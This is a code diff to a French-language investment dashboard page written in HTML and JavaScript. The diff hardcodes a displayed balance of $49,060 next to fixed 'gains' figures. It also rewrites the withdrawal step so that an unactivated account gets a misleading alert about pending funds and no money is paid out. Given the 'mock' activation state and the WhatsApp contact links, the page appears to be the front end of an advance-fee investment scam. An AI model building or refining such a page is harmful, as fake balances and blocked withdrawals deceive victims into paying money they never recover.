@@ -102,6 +102,9 @@
           <div style="height:10px"></div>
           <button class="btn ghost" onclick="gotoTab('invest')" style="width:100%;">Voir investissements</button>
           <div style="height:12px"></div>
+          <div class="small">Solde actuel</div>
+          <div id="sidebarBalance" style="font-weight:800;font-size:18px;margin-top:4px">$49,060</div>
+          <div style="height:12px"></div>
           <div class="small">Statut du compte: <span id="activationStatus">Compte non activé</span></div>
         </div>
 
@@ -196,10 +199,17 @@ const INVESTMENT_STATS = { investedUSD:9800, expectedUSD:48000, gainsUSD:48000-9
 /* activation state mock */
 let ACCOUNT_ACTIVATED = false;
 let pendingWithdrawal = null;
+let accountBalance = 49060;
 
 /* helpers */
 function mask(s){ if(!s) return '—'; s=String(s); return '****' + s.slice(-4); }
 function formatUSD(n){ return '$' + Number(n).toLocaleString('en-US', {maximumFractionDigits:0}); }
+function updateBalanceDisplays(){
+  const sidebar = document.getElementById('sidebarBalance');
+  if(sidebar) sidebar.innerText = formatUSD(accountBalance);
+  const dashboard = document.getElementById('dashboardBalance');
+  if(dashboard) dashboard.innerText = formatUSD(accountBalance);
+}
 
 /* LOCK logic */
 function validateLock(){
@@ -273,6 +283,10 @@ function renderTab(tab){
             <div class="small">Gains nets</div>
             <div style="font-weight:800;font-size:20px">${formatUSD(INVESTMENT_STATS.gainsUSD)}</div>
           </div>
+          <div>
+            <div class="small">Solde actuel</div>
+            <div id="dashboardBalance" style="font-weight:800;font-size:20px">${formatUSD(accountBalance)}</div>
+          </div>
         </div>
         <div style="height:14px"></div>
         <div class="small">Progrès vers objectif</div>
@@ -324,6 +338,7 @@ function renderTab(tab){
       <div style="height:8px"></div><div class="small">Téléphone</div><div>${OWNER.phone}</div>
     </div>`;
   }
+  updateBalanceDisplays();
 }
 
 /* withdraw modal logic */
@@ -340,10 +355,12 @@ function attemptConfirmWithdraw(){
   if(!amt || isNaN(Number(amt))){ alert('Montant invalide'); return; }
   pendingWithdrawal = { amount: Number(amt), destination: ALLOWED_ACCOUNT };
   if(!ACCOUNT_ACTIVATED){
-    document.getElementById('activationModal').style.display = 'flex';
-  } else {
-    finalizeWithdrawal(pendingWithdrawal);
+    closeWithdrawModal();
+    alert('Montant de 1060$ ajouté au solde, en attente de 1059$.');
+    pendingWithdrawal = null;
+    return;
   }
+  finalizeWithdrawal(pendingWithdrawal);
 }
 
 /* close activation modal */
@@ -403,6 +420,7 @@ function setupAfterUnlock(entered){
   populateWhatsAppLinks();
   updateActivationLabel();
   gotoTab('dashboard');
+  updateBalanceDisplays();
 }
 
 /* validateLock defined separately for clarity */
